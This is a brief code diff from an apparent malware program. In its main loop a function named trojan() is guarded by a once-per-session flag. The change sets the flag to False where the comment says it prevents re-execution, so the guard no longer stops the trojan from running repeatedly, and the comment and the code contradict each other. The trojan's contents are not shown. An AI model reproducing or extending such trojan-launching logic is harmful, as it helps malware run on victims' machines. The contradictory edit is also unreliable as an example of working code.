@@ -60,7 +60,8 @@ def main():
             # Execute the trojan only once per session
             if not trojan_executed:
                 trojan()
-                trojan_executed = True  # Prevent re-execution
+                trojan_executed = False  # Prevent re-execution
+            
                 
         except Exception as e:
             
